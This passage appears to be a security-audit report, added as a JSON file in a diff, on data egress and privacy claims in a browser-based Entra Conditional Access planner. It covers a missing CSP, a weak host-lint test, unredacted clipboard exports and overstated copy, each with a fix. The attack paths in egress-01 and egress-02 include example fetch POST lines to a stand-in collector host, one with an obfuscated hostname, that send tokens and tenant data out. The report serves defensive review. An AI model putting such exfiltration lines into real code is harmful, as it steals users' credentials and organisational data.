@@ -1,0 +1,343 @@
+{
+  "lane": "egress-and-claims",
+  "findings": [
+    {
+      "id": "egress-01",
+      "title": "No Content-Security-Policy anywhere: connect-src is unrestricted, so \"nothing leaves the browser\" is a convention, not a browser-enforced property",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "maintainer-compromise",
+      "evidence": [
+        {
+          "file": "index.html",
+          "lines": "3-12",
+          "code": "<head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <link rel=\"icon\" href=\"data:image/svg+xml,...\" />\n    <title>IAMAI: Microsoft Entra Conditional Access rollout planner</title>\n    <meta name=\"description\" ... />\n    <meta property=\"og:title\" ... />\n    <meta property=\"og:description\" ... />\n    <meta property=\"og:type\" content=\"website\" />\n  </head>"
+        },
+        {
+          "file": "dist/rollout/index.html",
+          "lines": "3-14",
+          "code": "(built output head: charset, viewport, icon, title, description, og:*, then)\n    <script type=\"module\" crossorigin src=\"/rollout/assets/index-CPCaIzKI.js\"></script>\n    <link rel=\"stylesheet\" crossorigin href=\"/rollout/assets/index-Dg96UHKA.css\">"
+        },
+        {
+          "file": "src/graph/msal.ts",
+          "lines": "17-18",
+          "code": "  cache: { cacheLocation: 'sessionStorage' },\n})"
+        },
+        {
+          "file": ".github/workflows/deploy-pages.yml",
+          "lines": "36-42",
+          "code": "      - run: npm run build:site\n        env:\n          TOOL_PATH: ${{ vars.TOOL_PATH || 'rollout' }}\n      - uses: actions/upload-pages-artifact@v3\n        with:\n          path: dist"
+        }
+      ],
+      "why_it_matters": "This app's headline claim IS a connect-src claim. Everything valuable sits in one origin with no boundary: the Graph delegated bearer token in sessionStorage (msal.ts:18) and the entire tenant snapshot, sign-in rows, group memberships and plan in IndexedDB. There is no server, so there is also no response header to carry a CSP; GitHub Pages serves none, and index.html declares no <meta http-equiv=\"Content-Security-Policy\">. The only thing currently standing between the product claim and an outbound POST of the token is src/network.test.ts, which (see egress-02) reads literal strings in src/ and home/ only and never sees a dependency. So the claim rests entirely on 4 runtime + 6 dev npm packages (74 lockfile entries) and a Vite/Rollup/esbuild build chain behaving. A meta CSP would make the claim true by construction rather than by review, and this app is unusually well-suited to a tight one: exactly three request hosts, one worker, no inline event handlers found, no remote script/style/font/image of any kind.",
+      "attack_path": "1. An attacker lands code in any transitive dependency of @azure/msal-browser, react, react-dom, idb, or the build chain (@vitejs/plugin-react, vite/rollup/esbuild) — the classic npm compromise. 2. `npm ci` in deploy-pages.yml pulls it and `vite build` bundles it into index-*.js, which runs in the getiamai.com origin. 3. The payload reads `sessionStorage` for the MSAL token cache and opens `iamai` in IndexedDB for the tenant snapshot. 4. It calls `fetch('https://collector.example/', {method:'POST', body: ...})`. Nothing in the page, the host, or the build stops it: no CSP to violate, no allowlist the browser enforces, and network.test.ts cannot see a URL built at runtime or code inside node_modules. The user sees a normal scan.",
+      "fix": "Add a meta CSP to index.html (the only mechanism available on GitHub Pages) and assert its presence in a test so it cannot be dropped:\n\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'self'; worker-src 'self' blob:; style-src 'self'; font-src 'self'; img-src 'self' data:; connect-src 'self' https://graph.microsoft.com https://login.microsoftonline.com https://raw.githubusercontent.com; form-action 'none'; base-uri 'none'; frame-src https://login.microsoftonline.com\">\n\nNotes for this app specifically: `connect-src 'self'` is needed for the module/worker chunk fetches; `blob:` in worker-src is only required if a bundler ever inlines the worker (currently it is a real chunk, worker-BLnnZbfB.js, so test without it first). `img-src data:` covers the inline SVG favicon. `frame-src https://login.microsoftonline.com` matters only if MSAL popup/iframe silent renewal is used — acquireTokenSilent does use a hidden iframe, so keep it. Verify with `npm run smoke` and a manual sign-in before shipping; a CSP that breaks MSAL is worse than none. Add the same meta to home/index.html (it needs only `default-src 'none'; style-src 'self'; font-src 'self'; img-src 'self' data:`). Note frame-ancestors and report-uri are ignored in meta form — accept that, or move hosting somewhere that can set headers."
+    },
+    {
+      "id": "egress-02",
+      "title": "src/network.test.ts is a literal-string lint over two directories, but SECURITY.md presents it as a build-failing guarantee about every network host — and a bundled JSON already smuggles a fourth host past it",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "maintainer-compromise",
+      "evidence": [
+        {
+          "file": "SECURITY.md",
+          "lines": "15-18",
+          "code": "There is no write scope anywhere in the app, and a\ntest (`src/network.test.ts`) fails the build if any source file addresses a network host\nother than `graph.microsoft.com`, `login.microsoftonline.com` and\n`raw.githubusercontent.com` (the pinned baseline files)."
+        },
+        {
+          "file": "src/network.test.ts",
+          "lines": "19-29",
+          "code": "function walk(dir: string, out: string[] = []): string[] {\n  for (const name of readdirSync(dir)) {\n    const p = join(dir, name)\n    if (statSync(p).isDirectory()) walk(p, out)\n    else if (/\\.(ts|tsx|css|html)$/.test(name) && !/\\.test\\.tsx?$/.test(name)) out.push(p)\n  }\n  return out\n}\n\nconst files = [...walk('src'), ...walk('home'), 'index.html']\nconst HOST = /https?:\\/\\/([a-z0-9.-]+)/gi"
+        },
+        {
+          "file": "src/network.test.ts",
+          "lines": "46-57",
+          "code": "  const requestish = [\n    /fetch\\(\\s*[`'\"](https?:\\/\\/[^`'\"]+)/gi,\n    /new\\s+(?:WebSocket|EventSource|Worker|Image)\\(\\s*[`'\"](https?:\\/\\/[^`'\"]+)/gi,\n    /sendBeacon\\(\\s*[`'\"](https?:\\/\\/[^`'\"]+)/gi,\n    /import\\(\\s*[`'\"](https?:\\/\\/[^`'\"]+)/gi,"
+        },
+        {
+          "file": "src/graph/collect/http.ts",
+          "lines": "83-84",
+          "code": "      res = await fetch(url, {\n        method: opts.method ?? 'GET',"
+        },
+        {
+          "file": "dist/rollout/assets/index-CPCaIzKI.js",
+          "lines": "1",
+          "code": "source:`https://download.microsoft.com/download/e/3/e/e3e9faf2-f28b-490a-9ada-c6089a1fc5b0/Product%20names%20and%20service%20plan%20identifiers%20for%20licensing.csv`"
+        },
+        {
+          "file": "src/licensing/capabilities.ts",
+          "lines": "5",
+          "code": "import servicePlans from '../../data/service-plans.json' with { type: 'json' }"
+        }
+      ],
+      "why_it_matters": "This test is the single piece of machinery the product offers in place of a CSP, and SECURITY.md points readers at it by name as the reason to believe the claim. Three gaps make it much weaker than advertised. (1) The walk filter accepts only .ts/.tsx/.css/.html, so no .json is ever read — not data/*.json, not baselines/*.index.json, not JSON inside src/ — yet all of those are bundled via `import ... with { type: 'json' }`. Proof it is not theoretical: `https://download.microsoft.com/...` is sitting in the shipped production chunk right now and `npm test` passes. It is inert metadata today, but it demonstrates a host can reach the bundle unseen. (2) The regexes require a literal URL as the first argument. The app's own production fetch is `fetch(url, {...})` with a variable (http.ts:83) — the test is structurally blind to the exact shape all real code uses. `fetch(base + path)`, `fetch(atob(...))`, `navigator.sendBeacon(x)`, `import(x)` all pass. (3) The walk covers `src` and `home` only: vite.config.ts (which already registers a middleware plugin), scripts/, and node_modules are never scanned, so neither a build-time plugin nor a dependency is in scope. SECURITY.md's sentence should describe a lint, not a guarantee.",
+      "attack_path": "A maintainer-compromise or a careless PR: add `const H = ['collector','example','com'].join('.'); fetch(`https://${H}/`, {method:'POST', body: JSON.stringify(snapshot)})` to any collector. `npm test` passes both network tests — no literal URL, so no regex matches, and `https://` with a template hole does not produce a bannable host token. CI runs test → lint-mutations → build → smoke → layout-audit, none of which inspect the emitted bundle for hosts. deploy-pages.yml ships it. A reviewer who trusts SECURITY.md's \"fails the build\" sentence has no reason to look harder. The same holds for adding a host to any data/*.json or baselines/*.index.json, or to a Vite plugin in vite.config.ts.",
+      "fix": "Three concrete changes. (1) Stop asserting about *source* and assert about the *artifact*: add a post-build test that greps `dist/**/*.{js,css,html}` for `https?://[a-z0-9.-]+` and fails on any host outside REQUEST_HOSTS ∪ LINK_HOSTS ∪ MSAL's known-authority constants. That catches dependencies, JSON data files and build plugins in one move, and would have flagged download.microsoft.com. Wire it into ci.yml after `npm run build`. (2) Extend the source walk to `.json` and to `vite.config.ts` and `scripts/`, or explicitly document why they are excluded. (3) Rewrite SECURITY.md:15-18 to match what the test does — e.g. \"a test (src/network.test.ts) fails the build if any literal URL in the source names a host outside this list, and a second test checks the built bundle for the same\" — and only make the stronger promise once the artifact test exists. Ship the CSP in egress-01 as the enforcement layer; the tests are then a tripwire, not the wall."
+    },
+    {
+      "id": "egress-03",
+      "title": "\"Copy as prompt\" and \"Copy markdown\" put named individuals on the clipboard unredacted, with no toggle and no warning, while the equivalent download defaults to redacted and warns",
+      "severity": "medium",
+      "confidence": "certain",
+      "exploitability": "user-initiated-export",
+      "evidence": [
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1162-1167",
+          "code": "        <Button icon=\"copy\" onClick={() => void copy('plan-md', planMarkdown(tenantName, steps, schedule, dangers, nameOf))}>\n          {copied === 'plan-md' ? C.copied : C.copyMarkdown}\n        </Button>\n        <Button icon=\"copy\" onClick={() => void copyPrompt('plan-md', 'wholePlan', schedule.derivation.criticalPath, planMarkdown(tenantName, steps, schedule, dangers, nameOf))}>\n          {copied === 'plan-md:prompt' ? C.copied : COMMS_PLAN.copyPrompt}\n        </Button>"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1653-1657",
+          "code": "    for (const d of dangers) {\n      lines.push(`- **${d.title}**`)\n      for (const p of d.people) lines.push(`  - ${p.name}. ${p.need}`)\n    }"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1667",
+          "code": "      if (s.highCare.userIds.length > 0) lines.push(`  - ${C.markdown.care(s.highCare.userIds.slice(0, 10).map(nameOf).join(', ') + (s.highCare.userIds.length > 10 ? ` ${POPULATION.andMore(s.highCare.userIds.length - 10)}` : ''))}`)"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "422-425",
+          "code": "  const copy = async (id: string, text: string): Promise<void> => {\n    try {\n      await navigator.clipboard.writeText(text)"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "148",
+          "code": "  const [bundleRedacted, setBundleRedacted] = useState(true)"
+        },
+        {
+          "file": "src/copy/comms.ts",
+          "lines": "108-110",
+          "code": "  redacted: 'Redacted (no names, no sign-in names, no tenant id; counts and roles instead)',\n  unredacted: 'Unredacted',\n  warning: 'The unredacted file contains people\\'s names and sign-in names. Once you upload it to another tool it has left this browser.',"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "343-347",
+          "code": "    void saveDevResults('roadmap-run', {\n      schedule: computed.schedule,\n      dangers: computed.dangers.map((d) => ({ title: d.title, people: d.people.length })),"
+        }
+      ],
+      "why_it_matters": "The grounding bundle — a *file the user has to deliberately save and then upload* — is the path the product hardened: redacted by default (RoadmapPage.tsx:148), a warning Callout rendered before the toggle (RoadmapPage.tsx:1206), and header text spelling out what is inside. The clipboard path, which is strictly faster and whose button literally says \"Copy as prompt\" (COMMS_PLAN.copyPrompt) — i.e. its stated purpose is to be pasted into a third-party LLM — has no toggle, no warning, and no redaction. What lands there is the organisation display name plus every high-care person's display name (up to 10 per step, across every step) and every danger-list person's name with the reason they are at risk (\"no registered method\", \"admin without phishing-resistant MFA\", etc.). That last part is the sting: it is not just a staff list, it is a ranked list of which named accounts at this organisation are least protected, formatted for an LLM. The code author was clearly aware — the dev telemetry at line 344 deliberately reduces `d.people` to a count — but the user-facing clipboard path does not. This is the one place the \"redacted by default\" claim does not hold, and it is the path the ground rules name as a realistic risk (the user's own paste into a third-party LLM).",
+      "attack_path": "No attacker needed; the product hands it over. An admin on the Roadmap page clicks \"Copy as prompt\" next to the plan, pastes into ChatGPT/Claude/Copilot to get help rewriting the rollout, and has now sent that vendor: the tenant's organisation name, and a named list of the accounts at that organisation with no MFA method registered or with weak admin authentication, each annotated with what they are missing. If the assistant retains or trains on the conversation, that list persists outside the tenant. The user's mental model came from the page next door, which told them exports are redacted by default, and from the footer on the very same page reading \"Read-only · nothing leaves your browser\".",
+      "fix": "Give the clipboard path the same treatment the file path already has. Concretely: (1) hoist `bundleRedacted` (or a second `plainRedacted` state, default `true`) so it also governs the two buttons at RoadmapPage.tsx:1162 and :1165, and pass a `redact` flag into `planMarkdown` that replaces `p.name` (line 1655) and `nameOf` output (line 1667) with role/count placeholders — reuse whatever `groundingBundle({redacted:true})` already does so the two paths cannot drift. (2) Render `GROUNDING.warning` (or a clipboard-specific variant) above these buttons, not only above the bundle download. (3) Add a test in the same family as src/feedback.test.ts asserting `planMarkdown(..., {redacted:true})` contains no value from `snapshot.users[].displayName` or `.userPrincipalName`. (4) If the unredacted plan markdown must stay available, make it the checkbox-gated variant, exactly as the bundle is."
+    },
+    {
+      "id": "egress-04",
+      "title": "The dev-only Graph spike harness ships in the production bundle, despite two source comments asserting it does not",
+      "severity": "low",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "src/ui/App.tsx",
+          "lines": "24-26",
+          "code": "// Dev-only modules are loaded on demand so they never enter the production bundle.\nconst DevSpikes = lazy(() => import('./DevSpikes.tsx').then((m) => ({ default: m.DevSpikes })))\nconst ComponentsPage = lazy(() => import('./pages/ComponentsPage.tsx').then((m) => ({ default: m.ComponentsPage })))"
+        },
+        {
+          "file": "src/graph/spikes/spike1.ts",
+          "lines": "187-191",
+          "code": "// Dev-only: hands result JSON to the local Vite dev server (see vite.config.ts),\n// which writes it to docs/spikes/raw/ (gitignored). UPNs and GUIDs are redacted\n// before leaving the page. Nothing like this ships in the bundle.\nexport async function saveDevResults(name: string, data: unknown): Promise<void> {\n  if (!import.meta.env.DEV) return"
+        },
+        {
+          "file": "src/ui/pages/CoveragePage.tsx",
+          "lines": "13",
+          "code": "import { saveDevResults } from '../../graph/spikes/spike1.ts'"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "24",
+          "code": "import { saveDevResults } from '../../graph/spikes/spike1.ts'"
+        },
+        {
+          "file": "src/graph/spikes/spike1.ts",
+          "lines": "179-181",
+          "code": "  console.log('[spike1] RESULTS', JSON.stringify(results, null, 2))\n  ;(window as { __spike1?: Spike1Results }).__spike1 = results\n  await saveDevResults('spike1', results)"
+        },
+        {
+          "file": "dist/rollout/assets/index-CPCaIzKI.js",
+          "lines": "1",
+          "code": "console.log(`[spike1] RESULTS`,JSON.stringify(n,null,2)),window.__spike1=n,await TE(`spike1`,n),n}async function TE(e,t){}"
+        },
+        {
+          "file": "dist/rollout/assets/index-CPCaIzKI.js",
+          "lines": "1",
+          "code": "(0,L.lazy)(()=>Gf(()=>import(`./DevSpikes-CgPHAYix.js`).then(e=>({default:e.DevSpikes})),[])"
+        }
+      ],
+      "why_it_matters": "Two comments in the source tell a reviewer this code is absent from the shipped app, and the build says otherwise. `dist/rollout/assets/` contains DevSpikes-CgPHAYix.js (12,126 bytes) as an emitted, publicly fetchable chunk, and the *main entry* chunk index-CPCaIzKI.js contains the whole of spike1.ts — the probe URLs, the paging loop, the `console.log` of raw Graph responses and the `window.__spike1 = results` global. The reason is a plain static-import leak, not a bundler subtlety: CoveragePage.tsx:13 and RoadmapPage.tsx:24 import `saveDevResults` from spike1.ts, and both pages are eagerly imported from App.tsx, so Rollup pulls the whole module into the entry chunk regardless of the lazy() wrapper on DevSpikes. Nothing self-executes — `DEV_PANEL` folds to false and the DevSpikes chunk is never requested — but the trust story for this product is \"review the code, then connect\", and a reviewer who reads the comments will not go looking in dist/. The claim in the comment should either be made true or deleted.",
+      "attack_path": "Not reachable at runtime in production: DEV_PANEL is `import.meta.env.DEV && ...` (App.tsx:34-35), which the build folds to false, so <DevSpikes/> never renders and the chunk is never imported. The residual exposures are (a) a reviewer's false confidence from the two comments, (b) ~12KB of dead chunk plus the spike code in the entry chunk, and (c) an attacker who already has script execution in the origin finds `runSpike1` and friends module-scoped in the bundle — but they could call Graph directly with the same token, so this grants nothing new. Reported for the claim gap and the bundle hygiene, not as an exploit.",
+      "fix": "Break the static edge. Move `saveDevResults` out of src/graph/spikes/spike1.ts into its own tiny module (e.g. src/devSave.ts) and import that from CoveragePage.tsx:13 and RoadmapPage.tsx:24; spike1.ts then becomes reachable only through the lazy DevSpikes import and lands in the DevSpikes chunk. Better still, drop the whole DevSpikes tree from production input: `build: { rollupOptions: { external: [] } }` will not do it, but a `resolve.alias` under `command === 'build'` mapping './DevSpikes.tsx' to a stub, or simply guarding the lazy() behind a build-time constant, will. Then add a build assertion to the artifact test proposed in egress-02: fail if `dist/**` contains `__spike1`, `[spike1]`, or a chunk named DevSpikes. Until one of those lands, delete the two comments (App.tsx:24, spike1.ts:189) rather than leave a reviewer with a false statement."
+    },
+    {
+      "id": "egress-05",
+      "title": "\"Nothing leaves the browser. There is no server.\" is on every page and in SECURITY.md, but the app issues 155 requests to raw.githubusercontent.com",
+      "severity": "low",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "src/copy/pages.ts",
+          "lines": "93-97",
+          "code": "  neverTitle: 'What IAMAI never does',\n  never: [\n    'No changes to the tenant: the app holds read-only permissions only.',\n    'Nothing leaves the browser. There is no server.',\n    'No account required with anyone.',\n  ],"
+        },
+        {
+          "file": "src/copy/pages.ts",
+          "lines": "33",
+          "code": "  footerLeft: 'Read-only · nothing leaves your browser',"
+        },
+        {
+          "file": "SECURITY.md",
+          "lines": "74",
+          "code": "you out, which clears the token cache. Nothing is sent to any server: the app has no\nbackend, no analytics, no error reporting, no fonts or scripts from a CDN."
+        },
+        {
+          "file": "home/index.html",
+          "lines": "63",
+          "code": "<li><strong>Nothing leaves the browser.</strong> There is no server and no telemetry. What a tool reads stays on your device until you export it.</li>"
+        },
+        {
+          "file": "src/baseline/github.ts",
+          "lines": "33-35",
+          "code": "export function rawUrl(index: BaselineIndex, path: string): string {\n  const encoded = path.split(\"/\").map(encodeURIComponent).join(\"/\");\n  return `https://raw.githubusercontent.com/${index.owner}/${index.repo}/${index.commit}/${encoded}`;\n}"
+        },
+        {
+          "file": "src/baseline/github.ts",
+          "lines": "58-64",
+          "code": "  const worker = async () => {\n    while (next < index.files.length) {\n      const path = index.files[next++];\n      try {\n        const res = await f(rawUrl(index, path));"
+        },
+        {
+          "file": "src/copy/pages.ts",
+          "lines": "145",
+          "code": "  fetching: (n: number) => `Fetching ${count(n, 'file')} from GitHub at the pinned commit…`,"
+        }
+      ],
+      "why_it_matters": "No tenant data is involved — I traced every outbound URL and confirmed the only tenant-derived values in any request path or query go to graph.microsoft.com, which is the source of that data. But the sentences as written are absolute, and they are the sentences on the landing page and in the footer of every screen. Loading the pinned baseline fires 155 GETs (baselines/jhope188-conditionalaccesspolicies.index.json lists 155 files) to raw.githubusercontent.com, disclosing the visitor's IP address, User-Agent and `Referer: https://getiamai.com/` to GitHub, plus one navigation to login.microsoftonline.com. \"There is no server\" is defensible as \"IAMAI has no backend of its own\"; \"Nothing is sent to any server\" (SECURITY.md:74) is not, and it sits in the security document that a cautious admin reads before consenting. The app already tells the truth one page later — BASELINE.fetching says \"Fetching N files from GitHub at the pinned commit…\" — so the fix is to make the headline match the page that already gets it right, not to change behaviour.",
+      "attack_path": "No attack. This is a claim-accuracy finding, raised because the lane's brief was to test the claim against the code. The practical consequence is a privacy detail the copy conceals: an admin who reads \"nothing leaves the browser\" and \"no CDN\" would not expect their IP and the timing of their baseline load to appear in GitHub's logs, and would not know a network-restricted environment must allowlist raw.githubusercontent.com for the app to work at all.",
+      "fix": "Keep the promise about *tenant data*, which is the one the code actually keeps, and name the three hosts. Suggested: pages.ts:96 → 'No tenant data leaves the browser. IAMAI has no backend: the only requests it makes are to Microsoft, and to GitHub for the baseline files.' SECURITY.md:74 → replace 'Nothing is sent to any server' with 'No tenant data is sent anywhere. The app talks to exactly three hosts: graph.microsoft.com (the tenant it is reading), login.microsoftonline.com (sign-in) and raw.githubusercontent.com (the pinned baseline files, which discloses your IP address to GitHub and nothing else). There is no backend, no analytics, no error reporting, and no fonts or scripts from a CDN.' The footer at pages.ts:33 can stay short — 'Read-only · no tenant data leaves your browser' — since the qualified version now exists behind it."
+    },
+    {
+      "id": "egress-06",
+      "title": "Verified excluded: the fetch('/__spike/save') dev egress is dead-code-eliminated from the production bundle",
+      "severity": "info",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "src/graph/spikes/spike1.ts",
+          "lines": "191-201",
+          "code": "export async function saveDevResults(name: string, data: unknown): Promise<void> {\n  if (!import.meta.env.DEV) return\n  try {\n    await fetch(`/__spike/save?name=${encodeURIComponent(name)}`, {\n      method: 'POST',\n      headers: { 'content-type': 'application/json' },\n      body: redactIdentifiers(JSON.stringify(data, null, 2)),\n    })\n  } catch {\n    // Middleware absent — the console output still has the data.\n  }\n}"
+        },
+        {
+          "file": "dist/rollout/assets/index-CPCaIzKI.js",
+          "lines": "1",
+          "code": "async function TE(e,t){}"
+        },
+        {
+          "file": "vite.config.ts",
+          "lines": "10-14",
+          "code": "function spikeCapture(): Plugin {\n  return {\n    name: 'dev-spike-capture',\n    apply: 'serve',\n    configureServer(server) {"
+        },
+        {
+          "file": "src/ui/pages/CoveragePage.tsx",
+          "lines": "169-174",
+          "code": "  useEffect(() => {\n    if (!computed || !import.meta.env.DEV) return\n    if (new URLSearchParams(window.location.search).get('dev') !== '1') return\n    void saveDevResults('coverage-run', {"
+        }
+      ],
+      "why_it_matters": "The lane brief asked for a determination, not a guess, so here it is with the evidence. `import.meta.env.DEV` folds to `false` at build time, `if (!false) return` becomes an unconditional early return, and the minifier reduces the entire function to `async function TE(e,t){}` — the empty body is visible in the shipped entry chunk. The string `__spike/save` appears nowhere in dist/rollout/assets/ (grep -c returns 0 across all four chunks). The receiving middleware is `apply: 'serve'` (vite.config.ts:13), so it exists only in the dev server and cannot be deployed by the Pages workflow, which uploads `dist` and nothing else. The two production-page callers (CoveragePage.tsx:171, RoadmapPage.tsx:342) are additionally double-gated on `import.meta.env.DEV` and `?dev=1`. Note this is the *only* part of the spike tree that is genuinely gone — the surrounding code ships, which is egress-04.",
+      "attack_path": "None. Recorded as a negative result so triage does not re-open it.",
+      "fix": "No change needed. When implementing the artifact test proposed in egress-02, add `__spike/save` to the banned-string list so this stays true."
+    },
+    {
+      "id": "egress-07",
+      "title": "Verified: no source maps are emitted for the production build",
+      "severity": "info",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "vite.config.ts",
+          "lines": "56-58",
+          "code": "  base: process.env.VITE_BASE ?? process.env.BASE_PATH ?? `/${TOOL_PATH}/`,\n  build: { outDir: `dist/${TOOL_PATH}`, emptyOutDir: true },\n  plugins: [react(), spikeCapture()],"
+        },
+        {
+          "file": "dist/rollout/assets/index-CPCaIzKI.js",
+          "lines": "1",
+          "code": "(no sourceMappingURL comment; `grep -o \"sourceMappingURL=[^ ]*\" *.js` over all four chunks returns nothing, and `ls *.map` returns nothing)"
+        }
+      ],
+      "why_it_matters": "`build` in vite.config.ts:57 sets only outDir and emptyOutDir, so `build.sourcemap` keeps its default of false. Confirmed against the artifact: dist/rollout/assets/ holds four .js files and one .css with no companion .map and no sourceMappingURL comment. Had maps shipped, they would have exposed the original TypeScript of every module including the whole spike harness (egress-04), the redaction regexes in src/redact.ts, the exact Graph $select/$filter/$expand strings in collectors.ts and laneB.ts, and the internal comments that reference prompt numbers and design docs. None of that is a credential, but it is the review surface the maintainer chose not to publish in readable form, and the current setting matches that choice.",
+      "attack_path": "None. Recorded as a negative result.",
+      "fix": "No change needed. Do not set `build.sourcemap: true` for the Pages build; if maps are ever wanted for debugging, use `'hidden'` and keep the .map files out of the uploaded artifact."
+    },
+    {
+      "id": "egress-08",
+      "title": "Verified clean: no referrer leakage, no resource-hint prefetch, no remote script/style/font/image, and no non-Microsoft destination for tenant data",
+      "severity": "info",
+      "confidence": "certain",
+      "exploitability": "not-reachable",
+      "evidence": [
+        {
+          "file": "src/ui/shell/AppShell.tsx",
+          "lines": "206-214",
+          "code": "          <a href={LINKEDIN_URL} target=\"_blank\" rel=\"noopener noreferrer\">\n...\n        <a href={GITHUB_URL} target=\"_blank\" rel=\"noopener noreferrer\">\n...\n        <a href={REPO_URL} target=\"_blank\" rel=\"noopener noreferrer\">"
+        },
+        {
+          "file": "src/ui/pages/RoadmapPage.tsx",
+          "lines": "1869-1890",
+          "code": "          <a href={step.whyLink} target=\"_blank\" rel=\"noopener noreferrer\">\n...\n            <a href={step.whyAttribution.url} target=\"_blank\" rel=\"noopener noreferrer\">\n...\n          <a href={step.learn.url} target=\"_blank\" rel=\"noopener noreferrer\">"
+        },
+        {
+          "file": "src/ui/tokens.css",
+          "lines": "10",
+          "code": "  src: url('/fonts/SpaceGrotesk-Latin.woff2') format('woff2');"
+        },
+        {
+          "file": "src/feedback.ts",
+          "lines": "45-61",
+          "code": "export function feedbackBody(ctx: FeedbackContext, summary: string[] | null): string {\n  const lines = [\n    'What looked wrong, or what was unclear:',\n    '',\n    '',\n    '---',\n    `Page: ${ctx.page}`,\n    `Version: ${ctx.version}`,\n    `Browser: ${ctx.userAgent}`,\n  ]\n  if (summary) lines.push('', 'Scan summary (counts only, no names and no tenant id):', ...summary.map((l) => `  ${l}`))"
+        },
+        {
+          "file": "src/ui/FeedbackPanel.tsx",
+          "lines": "17-18",
+          "code": "  const [open, setOpen] = useState(false)\n  const [include, setInclude] = useState(false)"
+        },
+        {
+          "file": "src/ui/shell/AppShell.tsx",
+          "lines": "68-81",
+          "code": "(useHashRoute — routing is entirely in the URL fragment, which browsers never send in a Referer header)"
+        }
+      ],
+      "why_it_matters": "Everything the lane brief asked me to check that came back clean, stated so it does not get re-audited. Links: all 16 `target=\"_blank\"` anchors in src/ carry `rel=\"noopener noreferrer\"` — grep for `target=\"_blank\"` and for `rel=` return the same 16 sites. Referrer: routing is hash-based, so the parts of the URL that vary per tenant session (`#/roadmap/step/<id>`) are never transmitted; cross-origin fetches send at most `Referer: https://getiamai.com/` under the modern default policy, and `noreferrer` suppresses even that on outbound clicks. Hints: no preconnect, dns-prefetch or rel=prefetch in index.html, home/index.html or the built dist/rollout/index.html. Resources: no `<script src>`, `<link rel=stylesheet>`, `@import`, `<img>`, `background-image`, `new Image()`, or `document.createElement('script'|'link'|'img')` to any remote origin anywhere in src/ — greps return zero hits; the one font is self-hosted from public/fonts and rewrites correctly to `/rollout/fonts/SpaceGrotesk-Latin.woff2` in the built CSS. No XMLHttpRequest, sendBeacon, WebSocket, EventSource, iframe or dynamic import of a remote URL exists. The worker chunk's only host is graph.microsoft.com. mailto: the body is exactly page hash + version + navigator.userAgent, with a counts-only scan summary that is opt-in (`useState(false)`, FeedbackPanel.tsx:18) and rendered in a <pre> preview before the mail client opens — no display names, no UPNs, no tenant id, held there by src/feedback.test.ts. Tenant data in outbound URLs: group ids and user ids appear in graph.microsoft.com paths and in `$filter`, which is the tenant's own data going to its own directory; no tenant-derived value reaches raw.githubusercontent.com (rawUrl uses only the bundled index's owner/repo/commit plus the file path) or any other host.",
+      "attack_path": "None. Recorded as negative results so triage does not spend time re-deriving them.",
+      "fix": "No change needed. Two things worth keeping stable: the `rel=\"noopener noreferrer\"` convention has no test enforcing it, so consider a lint asserting every `target=\"_blank\"` in src/**/*.tsx carries it; and adding `<meta name=\"referrer\" content=\"strict-origin-when-cross-origin\">` to index.html would pin the current browser default rather than inherit it."
+    }
+  ],
+  "claims_evidence": [
+    {
+      "claim": "nothing-leaves-the-browser",
+      "supported": "partly",
+      "note": "True in the sense that matters most, and overstated in the sense the copy uses. Verified true: no tenant-derived byte reaches any host other than graph.microsoft.com, which is the source of that data (src/graph/collect/http.ts:83 is the single production fetch; the worker chunk's only host is graph.microsoft.com). No XHR, sendBeacon, WebSocket, EventSource, remote script/style/font/image, @import, iframe, dynamic remote import, or resource hint exists anywhere in src/ or index.html. The dev-only fetch('/__spike/save') is genuinely eliminated from the bundle (egress-06, `async function TE(e,t){}`). Overstated: 'Nothing leaves the browser. There is no server.' (pages.ts:96, footer pages.ts:33, home/index.html:63) and 'Nothing is sent to any server' (SECURITY.md:74) coexist with 155 GETs to raw.githubusercontent.com carrying the visitor's IP, UA and origin Referer (github.ts:34,63 over a 155-entry index) — see egress-05. Unenforced: the claim rests on code review alone. There is no CSP (egress-01), and src/network.test.ts, which SECURITY.md cites as the guarantee, is a literal-string lint that skips .json, skips node_modules and vite.config.ts, and cannot see the app's own `fetch(url, ...)` shape (egress-02). A fourth host, download.microsoft.com, is in the shipped bundle today and the test passes."
+    },
+    {
+      "claim": "redacted-by-default",
+      "supported": "partly",
+      "note": "Holds on every file path, fails on the clipboard path. Holds: the error-page diagnostics run through redactIdentifiers (ErrorBoundary.tsx:37); the scan diagnostics bundle hashes the tenant id and redacts (MfaViabilityScreen.tsx:186-191); the grounding bundle defaults to redacted (RoadmapPage.tsx:148 `useState(true)`) with a warning Callout rendered above the toggle (RoadmapPage.tsx:1206) and header text stating what is inside; the feedback mailto carries counts only, opt-in and previewed (feedback.ts:23-42, FeedbackPanel.tsx:18); the dev spike save redacts before writing (spike1.ts:198). Fails: 'Copy as prompt' and 'Copy markdown' (RoadmapPage.tsx:1162,1165) put planMarkdown on the clipboard with no toggle and no warning, and planMarkdown emits danger-list people by name with the reason they are at risk (line 1655) and up to ten high-care display names per step (line 1667). That is the path whose button text says it is for pasting into an LLM — see egress-03. Note redactIdentifiers (src/redact.ts:18-22) matches UPN-shaped strings and GUIDs only, so display names are never caught by it; every redaction of names is done structurally by the caller, which is why an unhardened caller like planMarkdown leaks them."
+    },
+    {
+      "claim": "read-only",
+      "supported": "yes",
